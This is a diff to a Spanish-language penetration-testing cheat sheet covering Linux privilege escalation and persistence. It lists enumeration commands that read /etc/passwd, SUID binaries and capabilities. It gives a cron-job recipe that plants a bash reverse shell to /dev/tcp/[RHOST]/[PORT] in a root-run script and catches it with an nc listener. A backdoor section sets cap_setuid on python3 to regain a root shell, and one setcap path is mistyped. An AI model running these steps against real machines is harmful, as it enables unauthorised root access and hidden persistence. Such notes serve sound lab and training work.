@@ -759,17 +759,17 @@ ________________________________________________________________________________
 	sudo -l   ---   muestra comandos sudo que pueda utilizar el user
 	cat /etc/crontab   ---   tareas programadas
 	cat /etc/passwd   ---   sacar usuarios
-	systemctl list-timers   ---   
+	systemctl list-timers   ---   muestra los temporizadores de systemd
 	history   ---   ver el historial
-	pspy   ---   
+	pspy   ---   ver comandos que se ejecutan en segundo plano
 	ps -ef   ---   ver los procesos
 	ifconfig   ---   sacar NICs (Pivoting)
+	getcap -r / 2>/dev/null   ---   listar las capabilities activas
 	netstat	   ---   ver los servicios que estan corriendo
-	getcap -r / 2>/dev/null   ---   
-	ss -tulwn   --- 
+	ss -tulpn   ---   ver los servicios que estan corriendo
 	find / -perm -u=s -type f 2>/dev/null   ---   enumerar binarios con permiso suid
-	find / -type f -perm -04000 -ls 2>/dev/null
-	find / -perm -4000 2>/dev/null | xargs ls -l
+	find / -type f -perm -04000 -ls 2>/dev/null   ---   enumerar binarios con permiso suid
+	find / -perm -4000 2>/dev/null | xargs ls -l   ---   enumerar binarios con permiso suid
 *Si tras ganar acceso a una shell en la maquina objetivo, somos un usuario con pocos privilegios 
 pero tenemos acceso a /var/www/html podemos buscar mediante el siguiente comando find archivos de 
 configuracion que contengan contraseñas o datos sensibles, para empezar a ganar privilegios:
@@ -819,20 +819,20 @@ find . -iname '*config*' -type f -exec grep -nie 'pass.*=' --color=always /dev/n
 # CRON JOBS # Ver las tareas programadas mal configuradas
 	cat /etc/crontab
 # Comprobar los programas lanzados por root y ver si tenemos permisos de escritura en alguno
-	ls -lah   ---   comprobar quien es el propietario
-# Si hay permisos editar. Buscar una reverse shell
-# https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/
+	ls -lah
+# Si hay permisos editar un programa lanzado por root
+# Buscar una reverse shell y editar con el nombre del programa encontrado
+	reverse shell   ---   https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/
 	nano programa.sh
 	bash -i >& /dev/tcp/[RHOST]/[PORT] 0>&1
+# Como siempre, poner permisos de ejecucion si no los tiene
+	chmod +x programa.sh
+#En Kali solo habria que permanecer a la escucha
+	nc -lvnp 4444
+	root~#
 
-
-# CAPABILITIES #
-
-
-
-
-
-
+# PATH #
+# NFS #
 
 
 PRIVILEGE ESCALATION WINDOWS
@@ -864,6 +864,23 @@ ________________________________________________________________________________
 	WinPEAS
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 ACTIVE DIRECTORY
 _________________________________________________________________________________________
 
@@ -880,6 +897,19 @@ ________________________________________________________________________________
 
 PERSISTENCE (BACK DOOR)
 _________________________________________________________________________________________
+
+# CAPABILITIES # Metodo de persistencia, solo desde ROOT, escalamos privilegios colocando una capability 
+# Filtrar en https://gtfobins.github.io/ por capabilities y comprobar si estan instalados
+	which python3 
+		/usr/bin/python3
+# Siguiendo las intrucciones de gtfobins  
+	setcap cap_setuid+ep /usr/bin/python3
+# PUEDE FALLAR # Seguir este paso si no lo ejecuta, si no, pasar al siguiente
+	readlink -f /usr/bin/python3
+		/usr/bin/python3.8
+	setcap cap_setuid+ep /usr/bin//usr/bin/python3.8
+# Ahora solo hay que introducir el siguiente, y escalara privilegios otra vez
+	python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 
 
 EXTRACT CREDENTIALS
